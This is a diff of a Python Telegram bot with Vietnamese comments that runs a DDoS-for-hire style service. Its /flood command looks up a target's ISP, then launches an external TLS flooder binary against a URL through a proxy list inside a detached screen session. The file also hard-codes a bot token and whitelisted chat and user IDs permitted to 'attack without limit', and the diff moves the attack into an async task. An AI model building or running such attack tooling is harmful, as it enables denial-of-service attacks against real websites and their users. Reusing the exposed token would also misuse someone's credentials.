@@ -13,7 +13,7 @@ logging.basicConfig(level=logging.INFO)
 
 # Cấu hình
 ALLOWED_CHAT_ID = -1002673143239  # ID nhóm được phép sử dụng bot
-ALLOWED_USER_ID = [5622708943, 5942559129, 6926655784]  # ID user được phép tấn công không giới hạn
+ALLOWED_USER_ID = [5622708943, 5942559129]  # ID user được phép tấn công không giới hạn
 token_input = '7567331917:AAHPY5MjMiWV8_1STW2q5Q7sbzGiAokpbio'  # Token bot
 
 # Trạng thái
@@ -75,7 +75,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         isp_info = get_isp_info(ip)
         if isp_info:
             isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False)
-            isp_info_text = escape_html(isp_info_text[:4000])  # Giới hạn độ dài
+            isp_info_text = escape_html(isp_info_text[:4000])
             user_name = update.effective_user.first_name or "Người dùng"
             await update.message.reply_text(
                 f"🚀 Tấn công đã được gửi!\n📡 Thông tin ISP của host {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥 Tấn công bởi: {escape_html(user_name)} 🔥",
@@ -85,7 +85,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_attacking = True
         ongoing_info[update.effective_user.id] = {"url": url, "time_left": time}
 
-        # Chạy tiến trình bằng screen
         subprocess.Popen(
             f"screen -dmS tls bash -c 'chmod 777 * && ./tls {url} {time} 64 5 proxy.txt'",
             shell=True
@@ -95,9 +94,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ongoing_info[update.effective_user.id]["time_left"] = remaining
             await asyncio.sleep(1)
 
-        # Kết thúc screen
         subprocess.call(["screen", "-S", "tls", "-X", "quit"])
-
         await update.message.reply_text(f"✅ Đã hoàn thành tấn công: {escape_html(url)}")
 
     except IndexError:
@@ -112,6 +109,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         is_attacking = False
         ongoing_info.pop(update.effective_user.id, None)
+
+# Hàm trung gian để chạy attack trong task riêng
+async def handle_flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.application.create_task(attack(update, context))
 
 async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != ALLOWED_CHAT_ID:
@@ -140,7 +141,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     application = ApplicationBuilder().token(token_input).build()
 
-    application.add_handler(CommandHandler("flood", attack))
+    application.add_handler(CommandHandler("flood", handle_flood))  # chạy async task
     application.add_handler(CommandHandler("ongoing", ongoing))
     application.add_handler(CommandHandler("help", help_command))
 
